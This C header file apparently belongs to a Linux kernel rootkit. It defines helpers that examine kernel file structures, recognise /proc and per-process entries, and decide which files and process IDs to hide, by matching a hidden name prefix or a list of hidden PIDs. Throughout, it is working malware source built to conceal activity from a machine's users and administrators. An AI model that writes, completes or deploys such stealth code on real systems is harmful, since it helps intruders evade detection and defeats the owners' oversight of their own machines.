#ifndef _ROOTKIT_FILES_H_
#define _ROOTKIT_FILES_H_

#include "macro_utils.h"
#include "utils.h"
#include <linux/types.h>
// types.h is required for dirent.h, so we include it before
#include <linux/dcache.h>
#include <linux/dirent.h>
#include <linux/fdtable.h>
#include <linux/fs.h>
#include <linux/magic.h>
#include <linux/path.h>

/**
 * Structure representing a directory entry (legacy; deprecated and removed from the kernel).
 * This is used to parse the output of the `getdents` syscall.
 */
typedef struct linux_dirent {
    unsigned long d_ino;     // Inode number
    unsigned long d_off;     // Offset to next linux_dirent
    unsigned short d_reclen; // Length of this linux_dirent
    char d_name[];           // Filename (null-terminated)
} dirent_t;

typedef struct linux_dirent64 dirent64_t;

typedef struct file file_t;
typedef struct path path_t;
typedef struct inode inode_t;
typedef struct dentry dentry_t;
typedef struct files_struct files_t;

/**
 * Is the given file structure the root of a filesystem?
 *
 * @param p_file The file structure
 * @return `true` if the given file structure is the root of a filesystem, `false` otherwise
 */
static inline bool is_file_root(const file_t *const p_file)
{
    IF_U (p_file == NULL) {
        return false;
    }

    return IS_ROOT(p_file->f_path.dentry);
}

/**
 * Is the given file structure in a `proc` filesystem?
 *
 * @param p_file The file structure
 * @return `true` if the given file structure is in a proc filesystem, `false` otherwise
 */
static inline bool is_in_proc(const file_t *const p_file)
{
    const inode_t *p_inode = NULL; // Inode structure

    IF_U (p_file == NULL) {
        return false;
    }

    p_inode = file_inode(p_file);
    IF_U (p_inode == NULL) {
        return false;
    }

    return p_inode->i_sb->s_magic == PROC_SUPER_MAGIC;
}

/**
 * Is the given file structure the root of a `proc` filesystem?
 *
 * @param p_file The file structure
 * @return `true` if the given file structure is the root of a proc filesystem, `false` otherwise
 */
static inline bool is_proc_root(const file_t *const p_file)
{
    IF_U (p_file == NULL) {
        return false;
    }

    return is_file_root(p_file) && is_in_proc(p_file);
}

/**
 * Is the parent of the given file structure the root of a `proc` filesystem?
 *
 * @param p_file The file structure
 * @return `true` if the parent of the given file structure is the root of a proc filesystem,
 *         `false` otherwise
 */
static inline bool is_parent_proc_root(const file_t *const p_file)
{
    const dentry_t *p_parent = NULL; // Parent dentry structure

    IF_U (p_file == NULL) {
        return false;
    }

    p_parent = p_file->f_path.dentry->d_parent;

    return IS_ROOT(p_parent) && is_in_proc(p_file);
}

/**
 * Is the given file structure a strict descendant of the root of a `proc` filesystem?
 *
 * @param p_file The file structure
 * @return `true` if the given file structure is a strict descendant of the root of a proc
 *         filesystem, `false` otherwise
 */
static inline bool is_proc_descendant(const file_t *const p_file)
{
    IF_U (p_file == NULL) {
        return false;
    }

    return !is_file_root(p_file) && is_in_proc(p_file);
}

/**
 * Is the given file structure a process file?
 *
 * @param p_file   The file structure
 * @param ps_name  (Optional) This gets set to the name of the first directory
 *                 in the path after its root
 * @param p_pid    This gets set to the corresponding PID, if the given file structure is a process
 * @return `true` if the given file structure is a process file, `false` otherwise
 */
bool is_process_file(const file_t *const p_file, const char **const ps_name, pid_t *p_pid);

/**
 * Is the given file structure /proc/<pid> or one of its descendants?
 *
 * @param p_file  The file structure
 * @param i32_pid The PID
 * @return `true` if the given file structure is a descendant of /proc/<pid>, `false` otherwise
 */
static inline bool is_proc_pid_descendant(const file_t *const p_file, const pid_t i32_pid)
{
    pid_t i32_found_pid = -1; // PID of the process found in the path, if any

    IF_U (i32_pid < 0) {
        return false;
    }

    if (!is_process_file(p_file, NULL, &i32_found_pid)) {
        return false;
    }

    // Check if the parent directory is /proc/<pid>
    return i32_found_pid == i32_pid;
}

/**
 * Does the given file name need to be hidden?
 *
 * @param s_filename      The file name to check
 * @param b_is_proc_child Is the file a child of /proc/?
 * @return `true` if the given file needs to be hidden, `false` otherwise
 */
static inline bool is_filename_hidden(const char *const s_filename, const bool b_is_proc_child)
{
    pid_t i32_pid = 0; // PID as an integer

    // Check the name starts with the hidden prefix
    IF_U (!strncmp(s_filename, S_HIDDEN_PREFIX, HIDDEN_PREFIX_LEN)) {
        pr_info("[ROOTKIT] * This file name starts with the hidden prefix\n");
        return true;
    }

    // If the file is a child of /proc/, first check if its name is a number
    // If it is, check if the corresponding PID is hidden
    IF_U (b_is_proc_child) {
        // Convert the name to a number
        IF_U (kstrtoint(s_filename, 10, &i32_pid)) {
            // If the name is not a number, this is not a PID, so we can return false
            return false;
        }

        // Check if the PID is hidden
        IF_U (is_pid_hidden(i32_pid)) {
            return true;
        }
    }

    return false;
}

/**
 * Does the given file need to be hidden?
 * Checks if the file is a process file and needs to be hidden,
 * or if the file name starts with the hidden prefix.
 *
 * @param p_file The file structure to check
 * @return `true` if the given file needs to be hidden, `false` otherwise
 */
static inline bool is_file_hidden(const file_t *const p_file)
{
    pid_t i32_found_pid = -1; // PID of the process found in the path, if any

    IF_U (p_file == NULL) {
        return false;
    }

    IF_U (is_process_file(p_file, NULL, &i32_found_pid)) {
        pr_info("[ROOTKIT] * This is a process file (PID: %d)\n", i32_found_pid);

        // If the file is a process file, check if the process is hidden
        return is_pid_hidden(i32_found_pid);
    }
    else {
        pr_info("[ROOTKIT] * This is not a process file\n");
    }

    return is_filename_hidden(p_file->f_path.dentry->d_name.name, is_parent_proc_root(p_file));
}

/**
 * Gets the file structure associated with the given file descriptor.
 *
 * @param d_fd The file descriptor
 * @return The file structure associated with the given file descriptor
 */
const file_t *fd_get_file(const int d_fd);

/**
 * Gets the pathname of the given file.
 * The returned string must be freed with `kfree`/`kvfree`.
 *
 * @param p_file The file
 * @return The pathname of the given file
 */
const char *file_get_pathname(const file_t *const p_file);

/**
 * Gets the pathname of the file associated with the given file descriptor.
 * The returned string must be freed with `kfree`/`kvfree`.
 *
 * @param d_fd The file descriptor
 * @return The pathname of the file associated with the given file descriptor
 */
const char *fd_get_pathname(const int d_fd);

#endif
